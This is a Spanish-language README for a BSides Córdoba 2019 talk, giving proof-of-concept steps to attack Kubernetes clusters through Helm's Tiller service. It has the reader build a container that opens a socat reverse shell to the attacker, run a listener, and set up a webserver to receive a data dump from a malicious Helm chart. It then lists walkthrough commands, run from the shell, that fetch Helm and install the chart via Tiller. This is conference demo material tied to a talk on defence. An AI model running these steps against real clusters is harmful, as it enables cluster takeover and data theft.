# Bsides Córdoba2019

Este repositorio contiene los recursos necesarios para desplegar pruebas de concepto utilizando Tiller como vector/target de ataque.

* [Talk](https://www.youtube.com/watch?v=Ax7wMuxwMuY&t=20400)
* [Slides](https://bsidescordoba.org/slides/Preventing_attacks_to_Helm_on_K8s.pdf)

## Getting Started

El *startpoint* es una aplicación previamente vulnerada. Para simular el caso, en el folder `/app` se encuentran los archivos requeridos para desplegar una imagen que establecerá un *reverse-shell* contra la IP del atacante.

### Prerequisites

* Editar el archivo `/app/socat-shell.sh` indicando *address:port* del atacante en el campo `tcp`.
* Utilizar como *build context* el folder `/app`. Pushear la imagen obtenida a DockerHub.
* Editar el archivo `/app/pod.yaml` indicando *repository/image:tag* correspondiente en el campo `image`.
* Iniciar un *listener* en el host atacante, utilizando el valor *port* declarado en `/app/socat-shell.sh`:

```sh
socat file:`tty`,raw,echo=0 tcp-listen:port
```

* Desplegar un *pod* utilizando el archivo `/app/pod.yaml`.
* Iniciar un webserver local para recibir el *dump* de datos, ej: [mayth/simple-upload-server](https://hub.docker.com/r/mayth/simple-upload-server/).
* Editar el archivo `/templates/job.yaml` indicando *URL* del webserver del atacante en el campo `command`.
* Crear y publicar un *chart* de Helm utilizando los manifiestos incluídos en el folder `/templates`.

### Walkthrough

Desde el *reverse-shell*, ejecutar los siguientes comandos:

```sh
export HELM_HOME=$(pwd)/helmhome
export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134 #Default `tiller.svc`
export VER=v2.10.0 #Indica versión de Helm
curl -L "https://storage.googleapis.com/kubernetes-helm/helm-${VER}-linux-amd64.tar.gz" | tar xz --strip-components=1 -C . linux-amd64/helm #Descarga binario de Helm
./helm init --client-only #Inicia client-side de Helm
./helm repo add `chart-name` `chart-url` #Reemplazar por los valores obtenidos al momento de publicar el chart
./helm repo update
./helm install -n tiller-test `repository/chart-name` #Reemplazar por los valores obtenidos al momento de publicar el chart
./helm delete --purge tiller-test #Elimina workloads
```

Happy Helming!
